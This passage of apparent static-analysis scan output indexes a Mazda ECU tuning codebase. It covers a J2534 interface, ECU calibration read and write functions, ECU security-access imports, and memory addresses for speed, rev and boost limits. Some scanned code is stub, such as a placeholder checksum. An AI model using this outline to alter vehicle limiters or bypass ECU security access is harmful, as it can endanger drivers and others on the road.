{"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_FLAG_SCI_MODE = 0x0100"}, {"type": "protocol", "line": 83, "protocol": "CAN", "content": "TX_FLAG_CAN_29BIT_ID = 0x0100"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "TX_FLAG_CAN_29BIT_ID = 0x0100"}, {"type": "protocol", "line": 85, "protocol": "J2534", "content": "class J2534Interface:"}, {"type": "protocol", "line": 87, "protocol": "J2534", "content": "Complete J2534 Pass-Thru Interface Implementation"}, {"type": "protocol", "line": 99, "protocol": "J2534", "content": "logger.error(\"Failed to load J2534 library\")"}, {"type": "protocol", "line": 103, "protocol": "J2534", "content": "\"\"\"Load J2534 Pass-Thru DLL\"\"\""}, {"type": "protocol", "line": 111, "protocol": "J2534", "content": "\"C:\\\\Program Files\\\\Mazda\\\\IDS\\\\J2534PassThru.dll\","}, {"type": "protocol", "line": 112, "protocol": "J2534", "content": "\"C:\\\\Program Files (x86)\\\\Mazda\\\\IDS\\\\J2534PassThru.dll\","}, {"type": "protocol", "line": 113, "protocol": "J2534", "content": "\"C:\\\\Windows\\\\System32\\\\J2534PassThru.dll\","}, {"type": "protocol", "line": 114, "protocol": "J2534", "content": "\"C:\\\\Program Files\\\\Drew Technologies\\\\J2534 Pass-Thru\\\\J2534PassThru.dll\""}, {"type": "protocol", "line": 120, "protocol": "J2534", "content": "logger.info(f\"Loaded J2534 library from: {path}\")"}, {"type": "protocol", "line": 126, "protocol": "J2534", "content": "logger.error(\"No J2534 library found\")"}, {"type": "protocol", "line": 133, "protocol": "J2534", "content": "logger.error(\"J2534 interface only supported on Windows\")"}, {"type": "protocol", "line": 137, "protocol": "J2534", "content": "logger.error(f\"Error loading J2534 library: {e}\")"}, {"type": "protocol", "line": 141, "protocol": "J2534", "content": "\"\"\"Setup J2534 function prototypes\"\"\""}, {"type": "protocol", "line": 189, "protocol": "J2534", "content": "def connect(self, device_name: str = \"Mazda J2534\") -> bool:"}, {"type": "protocol", "line": 190, "protocol": "J2534", "content": "\"\"\"Connect to J2534 device\"\"\""}, {"type": "protocol", "line": 196, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 197, "protocol": "J2534", "content": "logger.error(f\"Failed to open J2534 device: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 201, "protocol": "J2534", "content": "logger.info(f\"Connected to J2534 device: {device_name}\")"}, {"type": "protocol", "line": 206, "protocol": "J2534", "content": "logger.error(f\"Error connecting to J2534 device: {e}\")"}, {"type": "protocol", "line": 209, "protocol": "J2534", "content": "def connect_channel(self, protocol: J2534Protocol, baudrate: int = 500000,"}, {"type": "protocol", "line": 214, "protocol": "J2534", "content": "logger.error(\"J2534 device not connected\")"}, {"type": "protocol", "line": 222, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 223, "protocol": "J2534", "content": "logger.error(f\"Failed to connect channel: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 246, "protocol": "J2534", "content": "logger.info(\"Disconnected from J2534 device\")"}, {"type": "protocol", "line": 263, "protocol": "J2534", "content": "logger.debug(f\"Sending J2534 message: {message_data.hex().upper()}\")"}, {"type": "protocol", "line": 309, "protocol": "J2534", "content": "self.channel_id, J2534Ioctl.SET_CONFIG,"}, {"type": "protocol", "line": 313, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 314, "protocol": "J2534", "content": "logger.error(f\"Failed to set protocol parameters: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 325, "protocol": "J2534", "content": "\"\"\"Build J2534 configuration list from parameters\"\"\""}, {"type": "protocol", "line": 358, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 359, "protocol": "J2534", "content": "logger.error(f\"Failed to create filter: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 370, "protocol": "J2534", "content": "\"\"\"Create J2534 PassThruMsg structure\"\"\""}, {"type": "protocol", "line": 383, "protocol": "CAN", "content": "msg.protocol_id = J2534Protocol.ISO15765  # Default to CAN"}, {"type": "protocol", "line": 383, "protocol": "J2534", "content": "msg.protocol_id = J2534Protocol.ISO15765  # Default to CAN"}, {"type": "protocol", "line": 402, "protocol": "J2534", "content": "self.channel_id, J2534Ioctl.READ_VBATT, None, ctypes.byref(voltage)"}, {"type": "protocol", "line": 405, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 406, "protocol": "J2534", "content": "logger.error(f\"Failed to read voltage: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 427, "protocol": "J2534", "content": "self.channel_id, J2534Ioctl.CLEAR_TX_BUFFER, None, None"}, {"type": "protocol", "line": 429, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 430, "protocol": "J2534", "content": "logger.warning(f\"Failed to clear TX buffer: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 434, "protocol": "J2534", "content": "self.channel_id, J2534Ioctl.CLEAR_RX_BUFFER, None, None"}, {"type": "protocol", "line": 436, "protocol": "J2534", "content": "if result != J2534Error.STATUS_NOERROR:"}, {"type": "protocol", "line": 437, "protocol": "J2534", "content": "logger.warning(f\"Failed to clear RX buffer: {J2534Error(result).name}\")"}, {"type": "protocol", "line": 439, "protocol": "J2534", "content": "logger.debug(\"Cleared J2534 buffers\")"}], "hardware_assumptions": [{"type": "hardware", "line": 88, "hardware": "vehicle", "content": "Provides low-level vehicle communication for Mazda diagnostics"}, {"type": "hardware", "line": 211, "hardware": "vehicle", "content": "\"\"\"Connect to vehicle communication channel\"\"\""}, {"type": "hardware", "line": 235, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle and device\"\"\""}, {"type": "hardware", "line": 254, "hardware": "vehicle", "content": "\"\"\"Send message to vehicle\"\"\""}, {"type": "hardware", "line": 275, "hardware": "vehicle", "content": "\"\"\"Receive message from vehicle\"\"\""}, {"type": "hardware", "line": 393, "hardware": "vehicle", "content": "def read_vehicle_voltage(self) -> Optional[float]:"}, {"type": "hardware", "line": 394, "hardware": "vehicle", "content": "\"\"\"Read vehicle battery voltage\"\"\""}, {"type": "hardware", "line": 411, "hardware": "vehicle", "content": "logger.debug(f\"Vehicle voltage: {voltage_volts:.1f}V\")"}, {"type": "hardware", "line": 415, "hardware": "vehicle", "content": "logger.error(f\"Error reading vehicle voltage: {e}\")"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds7.py", "lines_read": 471, "features_found": [{"type": "function", "name": "main", "line": 369}, {"type": "function", "name": "__init__", "line": 27}, {"type": "function", "name": "setup_logging", "line": 43}, {"type": "function", "name": "connect_to_vehicle", "line": 56}, {"type": "function", "name": "read_vehicle_information", "line": 97}, {"type": "function", "name": "read_diagnostic_trouble_codes", "line": 133}, {"type": "function", "name": "clear_diagnostic_trouble_codes", "line": 161}, {"type": "function", "name": "read_live_data", "line": 183}, {"type": "function", "name": "_decode_pid_value", "line": 209}, {"type": "function", "name": "read_ecu_calibration", "line": 215}, {"type": "function", "name": "program_ecu_calibration", "line": 257}, {"type": "function", "name": "perform_ecu_reset", "line": 303}, {"type": "function", "name": "generate_diagnostic_report", "line": 325}, {"type": "function", "name": "disconnect", "line": 358}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "core.diagnostic_protocols", "line": null}, {"type": "import", "module": "core.security_access", "line": null}, {"type": "import", "module": "databases.dtc_database", "line": null}, {"type": "import", "module": "databases.calibration_database", "line": null}, {"type": "import", "module": "services.programming_services", "line": null}, {"type": "import", "module": "interfaces.j2534_interface", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "argparse", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "MazdaDiagnosticProtocol,", "line": null}, {"type": "import", "module": "MazdaSecurityAccess,", "line": null}, {"type": "import", "module": "MazdaDTCDatabase", "line": null}, {"type": "import", "module": "MazdaCalibrationDatabase", "line": null}, {"type": "import", "module": "MazdaProgrammingService", "line": null}, {"type": "import", "module": "J2534Interface", "line": null}], "components_found": [{"type": "class", "name": "MazdaIDSSoftware", "line": 21}], "algorithms": [], "protocols": [{"type": "protocol", "line": 19, "protocol": "J2534", "content": "from interfaces.j2534_interface import J2534Interface"}, {"type": "protocol", "line": 36, "protocol": "J2534", "content": "self.j2534_interface = J2534Interface()"}, {"type": "protocol", "line": 57, "protocol": "J2534", "content": "\"\"\"Connect to vehicle using J2534 interface\"\"\""}, {"type": "protocol", "line": 63, "protocol": "J2534", "content": "logger.error(\"Failed to connect J2534 device\")"}, {"type": "protocol", "line": 68, "protocol": "J2534", "content": "protocol=self.j2534_interface.J2534Protocol.ISO15765,"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_data = self.diagnostic_protocol.read_data_by_identifier(0xF101)"}, {"type": "protocol", "line": 113, "protocol": "0x[0-9A-Fa-f]+", "content": "part_data = self.diagnostic_protocol.read_data_by_identifier(0xF104)"}, {"type": "protocol", "line": 118, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_data = self.diagnostic_protocol.read_data_by_identifier(0xF102)"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "sw_data = self.diagnostic_protocol.read_data_by_identifier(0xF106)"}, {"type": "protocol", "line": 143, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_info = self.diagnostic_protocol.read_dtc_information(0x02)  # Read by status"}, {"type": "protocol", "line": 210, "protocol": "PID", "content": "\"\"\"Decode PID value based on PID definition\"\"\""}, {"type": "protocol", "line": 232, "protocol": "0x[0-9A-Fa-f]+", "content": "start_address=0xFFA000,  # Start of calibration area"}, {"type": "protocol", "line": 233, "protocol": "0x[0-9A-Fa-f]+", "content": "length=0x8000  # Typical calibration size"}, {"type": "protocol", "line": 279, "protocol": "0x[0-9A-Fa-f]+", "content": "calibration_data, start_address=0xFFA000"}, {"type": "protocol", "line": 286, "protocol": "0x[0-9A-Fa-f]+", "content": "calibration_data, start_address=0xFFA000"}, {"type": "protocol", "line": 349, "protocol": "CAN", "content": "'protocol': 'ISO15765 CAN'"}, {"type": "protocol", "line": 425, "protocol": "PID", "content": "print(f\"  PID {pid}: {data['decoded_value']}\")"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "vehicle", "content": "Complete diagnostic and programming system for Mazda vehicles"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from core.security_access import MazdaSecurityAccess, MazdaSecurityAlgorithm"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "self.security_access = MazdaSecurityAccess()"}, {"type": "hardware", "line": 38, "hardware": "vehicle", "content": "self.vehicle_connected = False"}, {"type": "hardware", "line": 39, "hardware": "vehicle", "content": "self.current_vehicle_info = {}"}, {"type": "hardware", "line": 56, "hardware": "vehicle", "content": "def connect_to_vehicle(self) -> bool:"}, {"type": "hardware", "line": 57, "hardware": "vehicle", "content": "\"\"\"Connect to vehicle using J2534 interface\"\"\""}, {"type": "hardware", "line": 59, "hardware": "vehicle", "content": "logger.info(\"Connecting to vehicle...\")"}, {"type": "hardware", "line": 71, "hardware": "vehicle", "content": "logger.error(\"Failed to connect to vehicle channel\")"}, {"type": "hardware", "line": 78, "hardware": "vehicle", "content": "if not self.diagnostic_protocol.connect_to_vehicle():"}, {"type": "hardware", "line": 79, "hardware": "vehicle", "content": "logger.error(\"Failed to establish vehicle communication\")"}, {"type": "hardware", "line": 83, "hardware": "vehicle", "content": "vehicle_info = self.read_vehicle_information()"}, {"type": "hardware", "line": 84, "hardware": "vehicle", "content": "if vehicle_info:"}, {"type": "hardware", "line": 85, "hardware": "vehicle", "content": "self.current_vehicle_info = vehicle_info"}, {"type": "hardware", "line": 86, "hardware": "vehicle", "content": "logger.info(f\"Connected to vehicle: {vehicle_info.get('vin', 'Unknown')}\")"}, {"type": "hardware", "line": 87, "hardware": "vehicle", "content": "self.vehicle_connected = True"}, {"type": "hardware", "line": 90, "hardware": "vehicle", "content": "logger.error(\"Failed to read vehicle information\")"}, {"type": "hardware", "line": 94, "hardware": "vehicle", "content": "logger.error(f\"Error connecting to vehicle: {e}\")"}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "def read_vehicle_information(self) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 98, "hardware": "vehicle", "content": "\"\"\"Read complete vehicle information\"\"\""}, {"type": "hardware", "line": 100, "hardware": "vehicle", "content": "vehicle_info = {}"}, {"type": "hardware", "line": 110, "hardware": "vehicle", "content": "vehicle_info['vin'] = vin_data.decode('ascii', errors='ignore').strip()"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "vehicle_info['ecu_part_number'] = part_data.hex().upper()"}, {"type": "hardware", "line": 115, "hardware": "vehicle", "content": "vehicle_info['ecu_part_number'] = part_data.hex().upper()"}, {"type": "hardware", "line": 120, "hardware": "vehicle", "content": "vehicle_info['calibration_id'] = cal_data.decode('ascii', errors='ignore').strip()"}, {"type": "hardware", "line": 125, "hardware": "vehicle", "content": "vehicle_info['software_version'] = sw_data.hex().upper()"}, {"type": "hardware", "line": 127, "hardware": "vehicle", "content": "return vehicle_info if vehicle_info else None"}, {"type": "hardware", "line": 130, "hardware": "vehicle", "content": "logger.error(f\"Error reading vehicle information: {e}\")"}, {"type": "hardware", "line": 136, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 137, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 164, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 165, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 186, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 187, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "def read_ecu_calibration(self) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 216, "hardware": "ECU", "content": "\"\"\"Read current ECU calibration\"\"\""}, {"type": "hardware", "line": 218, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 219, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 222, "hardware": "ECU", "content": "logger.info(\"Reading ECU calibration...\")"}, {"type": "hardware", "line": 254, "hardware": "ECU", "content": "logger.error(f\"Error reading ECU calibration: {e}\")"}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "def program_ecu_calibration(self, calibration_data: bytes) -> bool:"}, {"type": "hardware", "line": 258, "hardware": "ECU", "content": "\"\"\"Program new calibration to ECU\"\"\""}, {"type": "hardware", "line": 260, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 261, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "logger.info(\"Programming ECU calibration...\")"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "logger.info(\"ECU calibration programmed successfully\")"}, {"type": "hardware", "line": 297, "hardware": "ECU", "content": "self.programming_service.reset_ecu()"}, {"type": "hardware", "line": 300, "hardware": "ECU", "content": "logger.error(f\"Error programming ECU calibration: {e}\")"}, {"type": "hardware", "line": 303, "hardware": "ECU", "content": "def perform_ecu_reset(self) -> bool:"}, {"type": "hardware", "line": 304, "hardware": "ECU", "content": "\"\"\"Perform ECU reset\"\"\""}, {"type": "hardware", "line": 306, "hardware": "vehicle", "content": "if not self.vehicle_connected:"}, {"type": "hardware", "line": 307, "hardware": "vehicle", "content": "logger.error(\"Vehicle not connected\")"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "logger.info(\"Performing ECU reset...\")"}, {"type": "hardware", "line": 312, "hardware": "ECU", "content": "result = self.programming_service.reset_ecu()"}, {"type": "hardware", "line": 315, "hardware": "ECU", "content": "logger.info(\"ECU reset completed successfully\")"}, {"type": "hardware", "line": 317, "hardware": "ECU", "content": "logger.error(\"ECU reset failed\")"}, {"type": "hardware", "line": 322, "hardware": "ECU", "content": "logger.error(f\"Error performing ECU reset: {e}\")"}, {"type": "hardware", "line": 328, "hardware": "vehicle", "content": "'vehicle_information': self.current_vehicle_info,"}, {"type": "hardware", "line": 329, "hardware": "vehicle", "content": "'connection_status': self.vehicle_connected,"}, {"type": "hardware", "line": 347, "hardware": "vehicle", "content": "'communication_quality': 'Good' if self.vehicle_connected else 'Poor',"}, {"type": "hardware", "line": 348, "hardware": "vehicle", "content": "'voltage': self.j2534_interface.read_vehicle_voltage(),"}, {"type": "hardware", "line": 359, "hardware": "vehicle", "content": "\"\"\"Disconnect from vehicle and cleanup\"\"\""}, {"type": "hardware", "line": 361, "hardware": "vehicle", "content": "if self.vehicle_connected:"}, {"type": "hardware", "line": 363, "hardware": "vehicle", "content": "self.vehicle_connected = False"}, {"type": "hardware", "line": 364, "hardware": "vehicle", "content": "logger.info(\"Disconnected from vehicle\")"}, {"type": "hardware", "line": 372, "hardware": "vehicle", "content": "parser.add_argument('--connect', action='store_true', help='Connect to vehicle')"}, {"type": "hardware", "line": 377, "hardware": "ECU", "content": "parser.add_argument('--read-calibration', action='store_true', help='Read ECU calibration')"}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "parser.add_argument('--reset-ecu', action='store_true', help='Reset ECU')"}, {"type": "hardware", "line": 387, "hardware": "vehicle", "content": "if software.connect_to_vehicle():"}, {"type": "hardware", "line": 388, "hardware": "vehicle", "content": "print(\"Successfully connected to vehicle\")"}, {"type": "hardware", "line": 390, "hardware": "vehicle", "content": "print(\"Failed to connect to vehicle\")"}, {"type": "hardware", "line": 394, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 395, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 407, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 408, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 417, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 418, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 428, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 429, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 434, "hardware": "vehicle", "content": "print(f\"VIN: {report['vehicle_information'].get('vin', 'Unknown')}\")"}, {"type": "hardware", "line": 435, "hardware": "vehicle", "content": "print(f\"Calibration: {report['vehicle_information'].get('calibration_id', 'Unknown')}\")"}, {"type": "hardware", "line": 442, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 443, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "calibration = software.read_ecu_calibration()"}, {"type": "hardware", "line": 453, "hardware": "ECU", "content": "if args.reset_ecu:"}, {"type": "hardware", "line": 454, "hardware": "vehicle", "content": "if not software.vehicle_connected:"}, {"type": "hardware", "line": 455, "hardware": "vehicle", "content": "print(\"Vehicle not connected - use --connect first\")"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "if software.perform_ecu_reset():"}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "print(\"ECU reset completed\")"}, {"type": "hardware", "line": 461, "hardware": "ECU", "content": "print(\"ECU reset failed\")"}], "security_logic": [{"type": "security_pattern", "line": 15, "pattern": "algorithm", "content": "from core.security_access import MazdaSecurityAccess, MazdaSecurityAlgorithm"}, {"type": "security_pattern", "line": 15, "pattern": "security_access", "content": "from core.security_access import MazdaSecurityAccess, MazdaSecurityAlgorithm"}, {"type": "security_pattern", "line": 32, "pattern": "security_access", "content": "self.security_access = MazdaSecurityAccess()"}, {"type": "security_pattern", "line": 340, "pattern": "key", "content": "key_pids = ['010C', '010D', '0104', '0105', '0111']  # RPM, Speed, Load, Coolant Temp, Throttle"}, {"type": "security_pattern", "line": 341, "pattern": "key", "content": "live_data = self.read_live_data(key_pids)"}, {"type": "security_pattern", "line": 463, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds8.py", "lines_read": 841, "features_found": [{"type": "function", "name": "__init__", "line": 50}, {"type": "function", "name": "set_calibration_database", "line": 55}, {"type": "function", "name": "read_full_calibration", "line": 59}, {"type": "function", "name": "_read_calibration_identification", "line": 104}, {"type": "function", "name": "_read_all_calibration_maps", "line": 135}, {"type": "function", "name": "_decode_calibration_map", "line": 180}, {"type": "function", "name": "_read_calibration_parameters", "line": 227}, {"type": "function", "name": "write_calibration", "line": 252}, {"type": "function", "name": "_write_calibration_map", "line": 301}, {"type": "function", "name": "_write_calibration_parameters", "line": 320}, {"type": "function", "name": "_update_calibration_checksum", "line": 346}, {"type": "function", "name": "_calculate_ecu_checksum", "line": 364}, {"type": "function", "name": "modify_calibration_map", "line": 369}, {"type": "function", "name": "_apply_map_adjustments", "line": 401}, {"type": "function", "name": "_interpolate_map", "line": 440}, {"type": "function", "name": "_encode_calibration_map", "line": 447}, {"type": "function", "name": "_calculate_calibration_checksum", "line": 486}, {"type": "function", "name": "_calculate_map_checksum", "line": 504}, {"type": "function", "name": "validate_calibration", "line": 508}, {"type": "function", "name": "_validate_calibration_map", "line": 559}, {"type": "function", "name": "_validate_calibration_parameters", "line": 603}, {"type": "function", "name": "_perform_safety_checks", "line": 633}, {"type": "function", "name": "generate_performance_tune", "line": 665}, {"type": "function", "name": "_create_performance_tune", "line": 702}, {"type": "function", "name": "_apply_stage1_modifications", "line": 723}, {"type": "function", "name": "_apply_stage2_modifications", "line": 737}, {"type": "function", "name": "_apply_stage3_modifications", "line": 752}, {"type": "function", "name": "create_calibration_backup", "line": 770}, {"type": "function", "name": "restore_calibration_backup", "line": 809}, {"type": "function", "name": "_get_current_timestamp", "line": 838}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Enum,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "datetime", "line": null}], "components_found": [{"type": "class", "name": "CalibrationOperation", "line": 19}, {"type": "class", "name": "MapAdjustmentType", "line": 29}, {"type": "class", "name": "MapAdjustment", "line": 37}, {"type": "class", "name": "MazdaCalibrationService", "line": 44}], "algorithms": [{"type": "algorithm_function", "line": 364, "content": "def _calculate_ecu_checksum(self) -> int:"}, {"type": "algorithm_function", "line": 486, "content": "def _calculate_calibration_checksum(self, calibration_data: Dict[str, Any]) -> str:"}, {"type": "algorithm_function", "line": 504, "content": "def _calculate_map_checksum(self, map_data: bytes) -> str:"}], "protocols": [{"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "READ_CALIBRATION = 0x01"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "WRITE_CALIBRATION = 0x02"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "VERIFY_CALIBRATION = 0x03"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "MODIFY_MAP = 0x04"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "ADJUST_PARAMETER = 0x05"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "GENERATE_CHECKSUM = 0x06"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "VALIDATE_CALIBRATION = 0x07"}, {"type": "protocol", "line": 31, "protocol": "0x[0-9A-Fa-f]+", "content": "OFFSET = 0x01"}, {"type": "protocol", "line": 32, "protocol": "0x[0-9A-Fa-f]+", "content": "SCALING = 0x02"}, {"type": "protocol", "line": 33, "protocol": "0x[0-9A-Fa-f]+", "content": "INTERPOLATION = 0x03"}, {"type": "protocol", "line": 34, "protocol": "0x[0-9A-Fa-f]+", "content": "CUSTOM = 0x04"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "def read_full_calibration(self, ecu_address: int = 0x7E0) -> Optional[Dict[str, Any]]:"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_data = self.diagnostic_protocol.read_data_by_identifier(0xF101)"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_id_data = self.diagnostic_protocol.read_data_by_identifier(0xF102)"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "part_data = self.diagnostic_protocol.read_data_by_identifier(0xF104)"}, {"type": "protocol", "line": 125, "protocol": "0x[0-9A-Fa-f]+", "content": "sw_data = self.diagnostic_protocol.read_data_by_identifier(0xF106)"}, {"type": "protocol", "line": 144, "protocol": "0x[0-9A-Fa-f]+", "content": "cal_id_data = self.diagnostic_protocol.read_data_by_identifier(0xF102)"}, {"type": "protocol", "line": 233, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': 0xFFB800,"}, {"type": "protocol", "line": 234, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': 0xFFB810,"}, {"type": "protocol", "line": 235, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_limit': 0xFFB820,"}, {"type": "protocol", "line": 236, "protocol": "0x[0-9A-Fa-f]+", "content": "'launch_control_rpm': 0xFFB830"}, {"type": "protocol", "line": 325, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': 0xFFB800,"}, {"type": "protocol", "line": 326, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': 0xFFB810,"}, {"type": "protocol", "line": 327, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_limit': 0xFFB820"}, {"type": "protocol", "line": 351, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum_address = 0xFFFFF0  # Typical checksum location"}, {"type": "protocol", "line": 367, "protocol": "0x[0-9A-Fa-f]+", "content": "return 0x12345678  # Placeholder"}], "hardware_assumptions": [{"type": "hardware", "line": 59, "hardware": "ECU", "content": "def read_full_calibration(self, ecu_address: int = 0x7E0) -> Optional[Dict[str, Any]]:"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "Read complete calibration from ECU"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "ecu_address: ECU address to read from"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "logger.info(\"Reading full ECU calibration...\")"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "identification['ecu_part_number'] = part_data.hex().upper()"}, {"type": "hardware", "line": 136, "hardware": "ECU", "content": "\"\"\"Read all calibration maps from ECU\"\"\""}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "\"\"\"Read calibration parameters from ECU\"\"\""}, {"type": "hardware", "line": 254, "hardware": "ECU", "content": "Write calibration data to ECU"}, {"type": "hardware", "line": 263, "hardware": "ECU", "content": "logger.info(\"Writing calibration to ECU...\")"}, {"type": "hardware", "line": 302, "hardware": "ECU", "content": "\"\"\"Write single calibration map to ECU\"\"\""}, {"type": "hardware", "line": 321, "hardware": "ECU", "content": "\"\"\"Write calibration parameters to ECU\"\"\""}, {"type": "hardware", "line": 347, "hardware": "ECU", "content": "\"\"\"Update calibration checksum in ECU\"\"\""}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "new_checksum = self._calculate_ecu_checksum()"}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "def _calculate_ecu_checksum(self) -> int:"}, {"type": "hardware", "line": 365, "hardware": "ECU", "content": "\"\"\"Calculate ECU checksum (simplified implementation)\"\"\""}, {"type": "hardware", "line": 793, "hardware": "vehicle", "content": "'vehicle_vin': current_calibration.get('identification', {}).get('vin', 'Unknown'),"}], "security_logic": [{"type": "security_pattern", "line": 10, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 497, "pattern": "hash", "content": "checksum = hashlib.sha256(combined_data).hexdigest()"}, {"type": "security_pattern", "line": 506, "pattern": "hash", "content": "return hashlib.md5(map_data).hexdigest()"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
